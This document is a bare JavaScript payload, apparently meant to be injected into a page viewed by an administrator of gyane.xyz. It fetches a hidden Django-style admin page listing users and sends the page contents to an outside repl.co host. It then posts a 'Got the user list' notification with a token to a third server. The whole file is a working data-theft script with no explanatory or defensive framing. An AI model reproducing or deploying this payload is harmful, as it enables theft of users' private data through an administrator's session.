redirected = false;
(async () => {
  res = await fetch(
    "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/20/change/"
  );
  redirected = res.redirected;
  data = await res.text();
  if (!redirected && res.status != 403) {
    fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co", {
      method: "POST",
      body: JSON.stringify({ data }),
      headers: {
        "Content-Type": "application/json",
      },
    });
    fetch("https://mattrab.joonshakya.com.np/", {
      method: "POST",
      body: JSON.stringify({
        to: 45,
        message: "Got the user list",
        n_id: 1000000,
        token: "c29tZW9uZSBnYXZlIGFjY2VzcyBtYXliZTQ1MTAwMDAwMA==",
      }),
      headers: {
        "Content-Type": "application/json",
      },
    });
  }
})();
